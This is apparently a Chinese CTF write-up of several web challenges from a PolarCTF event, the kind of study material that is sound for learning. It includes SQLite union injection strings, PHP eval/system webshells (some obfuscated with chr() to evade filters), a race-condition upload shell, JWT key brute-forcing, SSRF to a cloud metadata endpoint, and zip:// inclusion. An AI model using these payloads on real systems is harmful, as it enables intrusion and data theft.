# 2026-Spring-Polarctf

爆了一天说是，被云枢杯放鸽子了然后啥都没打，今天还是ccb，什么时候我也能打到ccb决赛就很强了。

**sql_search**

进去之后是一个查询页面，尝试了一下是字符型注入，先找列数：
<img width="2162" height="601" alt="image" src="https://github.com/user-attachments/assets/eabca252-1fdf-4bbc-be6b-aa90581982e3" />

可以看到列数为3，然后上union：
<img width="1984" height="527" alt="image" src="https://github.com/user-attachments/assets/d92e203d-68c1-4217-9268-a5f3ae9ea063" />

回显位有2，3，然后就是爆库，但是这里我发现这个并不是MySQL数据库而是sqlite，之前我都没怎么碰到过，看来还是才疏学浅了，等等找时间理一下不同数据库的相关查询语法等等：
```
' union select 1,group_concat(name),3 from sqlite_master where type='table'--

sqlite_master：SQLite的系统表，存储所有表、索引等元数据
type='table'：筛选出表类型的对象
group_concat(name)：将所有表名连接成一个字符串返回
回显位2：group_concat(name) 的结果会显示在第2个位置
```
看到flag的表名：

<img width="2193" height="532" alt="image" src="https://github.com/user-attachments/assets/a41fcc8d-0e8b-49ea-92d6-4b6457314fef" />

然后这里可以查一下表的结构：
```
' union select 1,group_concat(sql),3 from sqlite_master where name='flaggggggggggg'--
```
<img width="2084" height="491" alt="image" src="https://github.com/user-attachments/assets/0dd58ed7-168f-4d5d-8c3a-1518bef3e976" />

最后是找flag：
```
-- 根据表结构，flag在flag字段中
' union select 1,group_concat(flag),3 from flaggggggggggg--
-- 或者
' union select 1,flag,3 from flaggggggggggg--
```

<img width="1936" height="591" alt="image" src="https://github.com/user-attachments/assets/ac897bad-72fe-42df-ac68-572d9526d884" />

找到flag，又学到一个新的知识点~

**并发上传**

直接给了一个上传点，传了文件（shell.php）之后dirsearch扫到相应路径：

<img width="2218" height="335" alt="image" src="https://github.com/user-attachments/assets/c64a83b3-7608-4d2e-95c6-83c97c659f1c" />

可以看到是在/upload路径下的，那么访问一下我们之前上传的文件但发现直接是404：
<img width="1934" height="491" alt="image" src="https://github.com/user-attachments/assets/248b9541-258a-418f-bbbb-72879267f3f5" />

那么可能这里服务器把我们上传的文件删除了，考点很可能是条件竞争，那么这里用到的木马文件就要改一下：
```
<?php fputs(fopen("shell.php","w"),'<?php @eval($_POST["cmd"]); ?>'); ?>
```
如果后面成功访问之后产生的木马文件就会一直保留在服务器上，然后就是抓包爆破了，其中访问包的数量要大于上传包，这里先设置上传包：

<img width="1237" height="1088" alt="image" src="https://github.com/user-attachments/assets/85fe4f7b-6d9d-4b62-a0da-84bed81544cc" />

然后是访问包，这里要转到我们访问的url再抓爆到爆破模块，这里还要记得都选择无限攻击：

<img width="3069" height="1133" alt="image" src="https://github.com/user-attachments/assets/3bbf7753-e8c2-4882-ac62-d247c30db228" />

后面上传包和访问包同时开始攻击，当访问的包出现200（上传包都是2000）时即代表成功：

<img width="1956" height="537" alt="image" src="https://github.com/user-attachments/assets/a194a8be-7abb-4422-a6ee-114bda4e8397" />

那么就能访问我们的木马文件了：

<img width="1555" height="1072" alt="image" src="https://github.com/user-attachments/assets/34b4b633-37b8-498c-bb88-1df19f556bc0" />

最后找到flag即可。

**杰尼龟系统**

又是一个ping，以为是很简单的然后发现有很多干扰选项，首先ls之后会有一个setup.flag，查看一下，发现会设置假的flag：
```
<?php
// 设置flag文件 - 运行一次即可
$flag_content = "CTF{JennyGu1_RCE_P1ng_1nj3ct10n_F1@9}";

// 创建随机目录和flag文件
$random_dir = bin2hex(random_bytes(8));
$flag_dir = "./" . $random_dir;
$flag_file = $flag_dir . "/flag_" . bin2hex(random_bytes(4)) . ".txt";

// 创建目录和文件
if (!is_dir($flag_dir)) {
    mkdir($flag_dir, 0777, true);
}

file_put_contents($flag_file, $flag_content);

// 创建一些干扰文件
for ($i = 0; $i < 10; $i++) {
    $fake_file = $flag_dir . "/fake_" . bin2hex(random_bytes(4)) . ".txt";
    file_put_contents($fake_file, "这不是flag，继续寻找吧！");
}

// 在其他目录也创建一些干扰文件
$other_dirs = ['logs', 'tmp', 'uploads', 'backup'];
foreach ($other_dirs as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    for ($j = 0; $j < 5; $j++) {
        $fake_flag = $dir . "/flag_" . bin2hex(random_bytes(3)) . ".txt";
        file_put_contents($fake_flag, "假的flag: FLAG{THIS_IS_NOT_THE_REAL_ONE}");
    }
}

echo "Flag文件已设置！<br>";
echo "Flag文件路径: " . $flag_file . "<br>";
echo "Flag内容: " . $flag_content . "<br>";
echo "请删除此文件以确保安全。";
?>
```
同时根目录下也有一个flag.txt但是也是假的因此这里要用到模糊查询：
```
find / -name flag*
```
发现一个特殊路径的flag，尝试访问得到答案：
<img width="1133" height="199" alt="image" src="https://github.com/user-attachments/assets/ed5c6970-df14-47b6-aa09-7d804d16f60f" />

**Signed_Too_Weak**

页面直接给了备用账户密码登录，发现key为jwt，解密一下：
<img width="2609" height="850" alt="image" src="https://github.com/user-attachments/assets/9521a6ae-8975-40f4-b335-afdf1578bbb1" />

可以看到为user，那么改成admin再输入到url中尝试一下显示如下：
```
Bad signature five lowercase letters
密钥错误，签名验证失败,密钥是5个小写字母
```
那么这里可以用kali中自带的工具生成字典(直接放到桌面等等可以直接拖过来)
```
# Kali自带crunch工具，专门生成字典
crunch 5 5 abcdefghijklmnopqrstuvwxyz -o 5lowercase.txt

# 参数说明：
# 5 5    : 最小长度5，最大长度5
# abc... : 使用的字符集（小写字母）
# -o     : 输出文件

# 查看进度（crunch会显示预计大小）
# 26^5 = 11,881,376 行，约113MB

这里再提一嘴生成数字的：
# 生成10000-99999
seq 10000 99999 > 5digit_dict.txt
# 或生成00000-99999（带前导0）
seq -f "%05g" 0 99999 > 5digit_full.txt
```

然后在kali中输入如下命令进行爆破，这里的jwt为刚进入网站时给出的：
```
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NzQxNTMzMTMsImV4cCI6MTc3NDE1NjkxM30.F__RMCgorKkgO8wureBD8qd0Hs93OZH89YF_ZMSfXhg -C -d '/home/kali/Desktop/5lowercase.txt' 
```
得到密钥polar：
<img width="860" height="300" alt="image" src="https://github.com/user-attachments/assets/18ef49d9-a285-4206-9e62-d5825d902bc5" />

那么我们输入密钥，将得到的jwt再次输入即可拿到flag


**static**

给出了源代码：
```
<?php
    highlight_file(__FILE__);
    error_reporting(E_ALL);
    
    function hard_filter(&$file) {
        $ban_extend = array("php://", "zip://", "data://", "%2f", "%00", "\\");
        foreach ($ban_extend as $ban) {
            if (stristr($file, $ban)) {
                return false;
            }
        }

        $ban_keywords = array("eval", "system", "exec", "passthru", "shell_exec", "assert", "../");
        foreach ($ban_keywords as $keyword) {
            if (stristr($file, $keyword)) {
                $count = 0;
                $file = str_replace($keyword, "", $file, $count); 
                break;
            }
        }
        
        $file = rtrim($file, '/');
        if (strpos($file, "static/") !== 0) {
            return false;
        }
        
        return true;
    }

    $file = $_GET['file'] ?? '';
    if (!hard_filter($file)) {
        die("Illegal request!");
    }
    
    $real_file = $file . ".php";
    $real_path = realpath($real_file) ?: $real_file;
    
    echo "<br>=== 调试信息 ===<br>";
    echo "1. 原始输入: " . htmlspecialchars($_GET['file'] ?? '') . "<br>";
    echo "2. 过滤后file: " . htmlspecialchars($file) . "<br>";
    echo "3. 拼接后的路径: " . htmlspecialchars($real_file) . "<br>";
    echo "4. 真实解析路径: " . htmlspecialchars($real_path) . "<br>";
    echo "5. 文件是否存在: " . (file_exists($real_path) ? "是" : "否") . "<br>";
    
    if (file_exists($real_path)) {
        echo "6. 正在包含文件...<br>";
        ob_start();
        include($real_path);
        $content = ob_get_clean();
        echo "7. 文件内容: " . htmlspecialchars($content) . "<br>";
    } else {
        echo "6. 错误：文件不存在！<br>";
    }
?>
```
这里就是过滤了协议和命令执行的相关函数，我们需要去包含文件，然后这里比较重要的是 if (strpos($file, "static/") !== 0) 这部分，就是我们是要在static/路径下进行查找，然后这里还会去除最后的/，并且最后面是直接拼接php，可以先尝试?file=static/flag
<img width="1007" height="348" alt="image" src="https://github.com/user-attachments/assets/37e15476-df51-4445-a7ef-aa3fd1193221" />

没用，尝试目录遍历，输出如下：
<img width="1903" height="463" alt="image" src="https://github.com/user-attachments/assets/6ce04ebe-5a75-47b1-bfbf-57c868b730c6" />

还是不行，才发现有过滤，那么就是双写绕过即可：

<img width="1839" height="678" alt="image" src="https://github.com/user-attachments/assets/cdd8623c-b465-4a74-aba5-32d2c54b39a7" />

**云中来信**

<img width="2013" height="490" alt="image" src="https://github.com/user-attachments/assets/33cb8ee0-0817-4729-8e20-2683ae81c1a8" />

看着像是服务器端请求伪造（SSRF），但是这里设置了一个白名单，网上找了一下发现可以用@：

在URL中，@用于分隔认证信息和主机名。攻击者可构造形如http://allowed.com@127.0.0.1的URL，使服务器解析到127.0.0.1，而过滤器可能仅检查allowed.com

因此这里我们可以如下构造：
```
http://preview.polar@127.0.0.1
```
<img width="1858" height="1359" alt="image" src="https://github.com/user-attachments/assets/89b99f65-510c-4dc2-a16e-e8cec834238b" />

可以看到是能成功返回的，但是后面就不知道怎么做了，dirsearch扫路径也扫不出来点啥。看了wp，说是跟题目有关：云中来信，关系到了云服务器，网上有篇文章讲到云原数据攻击，选择这样一个路径：**目标地址/latest/meta-data**

如果这个能请求成功，则 认定能发起攻击（包括状态码5xx）,那么我们进行访问：

<img width="2137" height="1198" alt="image" src="https://github.com/user-attachments/assets/e9b5ecc9-bf04-4b99-9de0-d8504625a781" />

也是直接给出了我们需要进行的操作，按着来，直接放到自定义请求头中，再次访问/meta-data：

<img width="2510" height="1419" alt="image" src="https://github.com/user-attachments/assets/e2cb99a0-7f5d-4cd7-910d-ff4a574480b1" />

最后读取一下即可：
```
http://preview.polar@127.0.0.1/latest/meta-data/ctf/ec0cbb78afb6fb13dbf8
```

**Pandora Box**

也是一道文件上传题目，并且说只能上传png和jpg，最后还会拼接php，那么先上传一个正常的图片：
<img width="1661" height="431" alt="image" src="https://github.com/user-attachments/assets/f68e8f0d-c310-4f42-9c0b-3f7221c5ab8b" />

可以看到后缀拼接了.php，并且这里是include文件包含，看了视频之后说是在zip伪协议中可以直接读取压缩包的内部文件，尝试将一句话木马压缩为zip，并更改后缀为jpg进行上传，之后用zip伪协议进行读取：
<img width="2638" height="618" alt="image" src="https://github.com/user-attachments/assets/e8a7cb32-12fe-48e4-bb57-e2aff953f9e8" />

发现不再报错，可以进行蚁剑连接。然后这里的原理也说一下：
```
原理：

PHP 支持封装协议，比如 zip:// 可以读取 zip 压缩包内的文件
zip:///path/to/archive.zip#innerfile 表示：打开 /path/to/archive.zip 这个压缩包，读取其中的 innerfile
这里 upload/xxx.jpg 虽然后缀是 .jpg，但实际上是 zip 格式，所以 PHP 的 zip:// 协议可以正常解析它
%23 是 # 的 URL 编码，因为 # 在 URL 中是锚点标识，必须编码才能作为路径的一部分
#shell 是指压缩包内的文件名为 shell（即压缩时里面的那个一句话木马文件）

其中# 用来分隔压缩包路径和内部文件名
格式固定：zip://压缩包绝对路径#内部文件
zip://upload/xxx.jpg#shell
意思是：打开 upload/xxx.jpg（它是一个 zip 格式的压缩包），取出里面的 shell 文件。
```

**GET**

又是文件上传，其实现在这种单一考点已经很少的，更接近于实际的渗透或者cve，这里测试了一下应该是黑名单，可以双写绕过，但是还会对文本内容进行检测：

<img width="1948" height="517" alt="image" src="https://github.com/user-attachments/assets/2dd6ee40-b2e8-4525-a018-b4cdc4f89abf" />

直接输入post这样的会被检测出来，那么看一下chr转换之后能不能绕过：
```
<?php
$f = chr(101).chr(118).chr(97).chr(108);
$p = chr(95).chr(80).chr(79).chr(83).chr(84);
$c = chr(99).chr(109).chr(100);
@$f($$p[$c]);
?>
```
<img width="1963" height="645" alt="image" src="https://github.com/user-attachments/assets/c4fd8cdf-7e22-4cbb-a266-4624a7aab783" />

可以看到也是上传成功，但是连接蚁剑却连不上，浏览器里看一下也是500，那么很可能是没有被正确解析吧，那就不连蚁剑了按照视频里的来：
```
<?php
$func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$cmd='';
$cmd_chars = [108,115];  #ls
foreach($cmd_chars as $ascii) {
    $cmd .= chr($ascii);
}   #动态构造命令
@$func($cmd);
?>
```
<img width="2767" height="295" alt="image" src="https://github.com/user-attachments/assets/7a8e48dc-8024-4b1d-ae4d-f5b171221d6f" />

可以看到这里就是我们之前上传的一些文件，然后看一下根目录，里面修改一下就行，那么再回到/var/www/html目录下，看到有几个文件：

<img width="2138" height="346" alt="image" src="https://github.com/user-attachments/assets/a62d7908-8f3d-48a8-b99c-7d0257b1e7ec" />

读取一下robot.txt,看到一个感觉很莫名其妙的话：_If it won't open, maybe try including each other and see._

视频里面说是相互包含，两个文件先取一个为路径，然后再?file-另一个文件路径，好抽象...

<img width="2886" height="652" alt="image" src="https://github.com/user-attachments/assets/0f2c2e17-0dab-4e40-b57f-aebe34b4b883" />

**狗黑子最后的起舞**

开始就一个界面其他啥都没有，扫个目录，发现登录和注册框，进去之后看到路径变了：

<img width="2210" height="325" alt="image" src="https://github.com/user-attachments/assets/235c9a41-d795-4532-8327-b322cf478fa2" />

但是其他也啥都没有，学到一个知识，遇事不决扫目录，第一次碰到要扫两次目录的，发现了好多/.git路径下的，说明存在源码泄露，使用工具githack：
```
python GitHack.py http://97dcd1c2-ca10-4458-b16a-597eb9914570.www.polarctf.com:8090/ghzpolar/.git/
```
成功拿到了gouheizi.php:
```
if (isset($_FILES['file'])) {
    $f = $_FILES['file'];
    if ($f['error'] === UPLOAD_ERR_OK) {
        // 上传到 /etc/ 目录，文件名格式：时间戳_原文件名
        $dest = '/etc/' . time() . '_' . basename($f['name']);
        
        if (move_uploaded_file($f['tmp_name'], $dest)) {
            $escapedDest = escapeshellarg($dest);
            // 解压 ZIP 文件到 /etc/ 目录
            exec("unzip -o $escapedDest -d /etc/ 2>&1");
            // 这里有个奇怪的重复执行（可能是代码冗余）
            if ($code !== 0) {
                exec("unzip -o $escapedDest -d /etc/ 2>&1");
            }
            // 删除上传的 ZIP 文件
            unlink($dest);
            echo "ghz";
        }
    }
}
```




